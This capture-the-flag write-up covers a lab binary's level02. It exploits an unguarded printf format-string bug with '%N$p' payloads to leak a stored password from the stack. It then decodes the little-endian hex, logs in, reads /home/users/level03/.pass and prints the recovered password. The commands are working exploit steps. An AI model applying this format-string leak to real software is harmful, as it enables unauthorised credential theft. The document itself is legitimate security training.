# level02

Nothing of note with `ll` and `checksec`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|strncmp|main|
|puts||
|fread||
|fclose||
|system||
|printf||
|strcspn||
|fgets||
|fopen||
|exit||
|fwrite||

The `main()` function has no `return`, only calls to `exit()` and as such we will not be able to overflow using the return value.

However, there is an unguarded `printf()` near the end of the code.
This means that we can exploit this by printing stack values

```sh
for i in $(seq 1 40); do (python -c "print('%$i\$p'); print('A1B2C3D4E5F6G7H8')" | ./level02) | grep do; done;

[...]
0x3444334332423141 does not have access!			# < 4D3C2B1A
0x3848374736463545 does not have access!			# < 8H7H6F5E
[...]
```

Firstly we found two interesting hex values. Let's convert those to chars
```sh
echo -n "3444334332423141" | xxd -r -p; echo;
4D3C2B1A
```

Well, we now have the first half of our password but in the reverse order we wrote it in...
Let's now convert the two hex values at once

```sh
echo -n "34443343324231413848374736463545" | xxd -r -p; echo;
4D3C2B1A8H7G6F5E
```

The two halves are in the correct order but each in little endian. We'll now convert them to big endian then to chars.

```sh
echo -n $(echo "3444334332423141" | rev | sed -E 's/(.)(.)/\2\1/g')$ | xxd -r -p; \
echo -n $(echo "3848374736463545" | rev | sed -E 's/(.)(.)/\2\1/g')$ | xxd -r -p; echo;
A1B2C3D4E5F6G7H8
```

So we found that using the printf exploit from earlier we managed to read strings from memory (albeit with a bit of shenanigans), let's try to find our password in the exploit's output.

```sh
[...]
0x756e505234376848 does not have access!
0x45414a3561733951 does not have access!
0x377a7143574e6758 does not have access!
0x354a35686e475873 does not have access!
0x48336750664b394d does not have access!
[...]
```

It seems we found 5 pointer values of **16 hexadecimal digit** each. Which makes a total of **80 digits**.
There are **2 hex digits** for an ascii letter, thus our **80 digits** turn into **40 chars**.
Up until now the passwords have been **40 bytes** long and the `fread()` in the program reads **41 bytes** (password + null byte).

```c
length_read = fread(read_buffer, 1, 41, password_fd);
```

So we will apply the method from earlier

```sh
for hex_value in 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d; do (echo -n $(echo "$hex_value" | rev | sed -E 's/(.)(.)/\2\1/g')$ | xxd -r -p;); done ; echo;

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

(cat <(python -c "print('alec'); print('Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H')") -) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
Greetings, alec!
whoami
level03
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Yay! It's not like we had the password before anyway lol.


```sh
su level03
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

I don't have a funny comment to make this time.
